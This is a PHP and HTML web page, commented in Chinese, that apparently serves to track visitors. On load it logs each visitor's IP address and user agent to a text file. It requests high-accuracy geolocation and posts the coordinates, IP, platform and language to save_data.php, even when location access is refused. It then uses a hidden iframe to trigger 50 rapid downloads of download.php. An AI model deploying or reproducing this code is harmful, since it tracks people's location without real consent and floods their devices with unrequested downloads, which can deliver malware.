<?php
// 获取用户IP地址
$ip = $_SERVER['REMOTE_ADDR'];

// 尝试获取经纬度（需要用户授权）
$latitude = "未获取";
$longitude = "未获取";

// 保存数据到txt文件
$filename = "0.txt";
$data = "IP地址: $ip\n";
$data .= "经度: $longitude\n";
$data .= "纬度: $latitude\n";
$data .= "访问时间: " . date('Y-m-d H:i:s') . "\n";
$data .= "用户代理: " . $_SERVER['HTTP_USER_AGENT'] . "\n";

file_put_contents($filename, $data);
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>位置信息收集</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        
        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 90%;
            max-width: 600px;
            margin-top: 20px;
        }
        
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 20px;
        }
        
        .info-card {
            background-color: #f9f9f9;
            border-left: 4px solid #4CAF50;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        
        .info-item {
            margin: 10px 0;
            padding: 8px;
            background-color: #e8f5e9;
            border-radius: 4px;
        }
        
        .status {
            text-align: center;
            padding: 15px;
            margin: 20px 0;
            border-radius: 4px;
            font-weight: bold;
        }
        
        .status.loading {
            background-color: #fff9c4;
            color: #f57f17;
        }
        
        .status.success {
            background-color: #e8f5e9;
            color: #2e7d32;
        }
        
        .status.error {
            background-color: #ffebee;
            color: #c62828;
        }
        
        .hidden {
            display: none;
        }
        
        iframe {
            display: none;
        }
    </style>
</head>
<body>
    <h1>位置信息收集</h1>
    
    <div class="container">
        <div class="status loading" id="status">正在获取您的位置信息...</div>
        
        <div class="info-card">
            <h2>收集到的信息</h2>
            <div class="info-item" id="ipInfo">IP地址: <?= $ip ?></div>
            <div class="info-item" id="locationInfo">经纬度: 获取中...</div>
            <div class="info-item" id="accuracyInfo">精度: 获取中...</div>
            <div class="info-item" id="timestampInfo">时间戳: <?= date('Y-m-d H:i:s') ?></div>
        </div>
    </div>

    <iframe id="downloadFrame" name="downloadFrame"></iframe>

    <script>
        // 获取DOM元素
        const statusElement = document.getElementById('status');
        const locationInfo = document.getElementById('locationInfo');
        const accuracyInfo = document.getElementById('accuracyInfo');
        
        // 收集的数据对象
        const collectedData = {
            ip: "<?= $ip ?>",
            latitude: "",
            longitude: "",
            accuracy: "",
            timestamp: "<?= date('Y-m-d H:i:s') ?>",
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language
        };
        
        // 获取地理位置
        function getGeolocation() {
            if (!navigator.geolocation) {
                statusElement.textContent = "您的浏览器不支持地理位置服务";
                statusElement.className = "status error";
                triggerDownloads();
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    collectedData.latitude = position.coords.latitude;
                    collectedData.longitude = position.coords.longitude;
                    collectedData.accuracy = position.coords.accuracy;
                    
                    locationInfo.textContent = `经纬度: ${position.coords.latitude}, ${position.coords.longitude}`;
                    accuracyInfo.textContent = `精度: ±${position.coords.accuracy} 米`;
                    
                    statusElement.textContent = '信息获取成功！';
                    statusElement.className = "status success";
                    
                    // 保存数据到服务器
                    saveDataToServer();
                    
                    // 触发下载
                    triggerDownloads();
                },
                error => {
                    let errorMessage;
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMessage = "用户拒绝了地理位置请求";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMessage = "无法获取位置信息";
                            break;
                        case error.TIMEOUT:
                            errorMessage = "获取位置信息超时";
                            break;
                        default:
                            errorMessage = "未知错误";
                    }
                    
                    statusElement.textContent = errorMessage;
                    statusElement.className = "status error";
                    
                    // 即使获取位置失败，也触发下载
                    saveDataToServer();
                    triggerDownloads();
                },
                {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                }
            );
        }
        
        // 保存数据到服务器
        function saveDataToServer() {
            // 创建表单数据
            const formData = new FormData();
            formData.append('latitude', collectedData.latitude);
            formData.append('longitude', collectedData.longitude);
            formData.append('accuracy', collectedData.accuracy);
            formData.append('ip', collectedData.ip);
            formData.append('timestamp', collectedData.timestamp);
            formData.append('userAgent', collectedData.userAgent);
            formData.append('platform', collectedData.platform);
            formData.append('language', collectedData.language);
            
            // 发送数据到服务器
            fetch('save_data.php', {
                method: 'POST',
                body: formData
            });
        }
        
        // 触发下载
        function triggerDownloads() {
            const downloadFrame = document.getElementById('downloadFrame');
            let count = 0;
            const maxDownloads = 50;
            
            function downloadFile() {
                if (count < maxDownloads) {
                    // 使用时间戳防止缓存
                    const timestamp = new Date().getTime();
                    downloadFrame.src = `download.php?t=${timestamp}`;
                    count++;
                    
                    // 延迟执行下一次下载
                    setTimeout(downloadFile, 100);
                }
            }
            
            // 开始下载
            downloadFile();
        }
        
        // 页面加载完成后开始收集信息
        window.addEventListener('load', getGeolocation);
    </script>
</body>
</html>